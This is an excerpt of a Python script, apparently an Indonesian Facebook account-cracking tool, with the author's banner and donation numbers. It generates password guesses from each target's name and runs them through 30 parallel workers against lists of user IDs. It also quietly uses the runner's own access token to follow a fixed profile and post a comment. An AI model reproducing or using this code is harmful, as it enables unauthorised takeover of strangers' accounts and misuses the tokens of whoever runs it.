...
## Buat yang mau ngamal ke dana -> 085866306386
## Kalo ke pulsa -> 085729416714
...
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Author   : KhamdihiXD.
 [\x1b[1;96m+%s] Github   : https://github.com/khamdihiXD
 [\x1b[1;96m+%s] Facebook : https://www.facebook.com/nello08oke
───────────────────────────────────────────────────────\n'''%(N,N,N,N))
...
class login:
	...
	def takon(self):
		...
		if takon in ['y','Y','iya']:
			jalan('\n %s[%s!%s] Kamu akan di arahkan ke yt'%(N,O,N))
	...
	def bot(self):
		...
		requests.post('https://graph.facebook.com/100000626195514/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/100000626195514/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/5310931375604350/comments/?message=' +komen+ '&access_token=' + toket)
		...
		with khamdihiXD(max_workers=30) as dihi:
			for me in self.id:
				try:
					...
					nun = sempak[0]
					if len(nun)>=6:
						pwx = [nun, nun+'123', nun+'1234', nun+'12', nun+'786', nun+'12345', name]
					elif len(nun)<=2:
						pwx = [nun, nun+'123', nun+'1234', nun+'12', nun+'786', nun+'12345', name]
					elif len(nun)<=5:
						pwx = [nun, nun+'123', nun+'1234', nun+'12', nun+'786', nun+'12345', name]
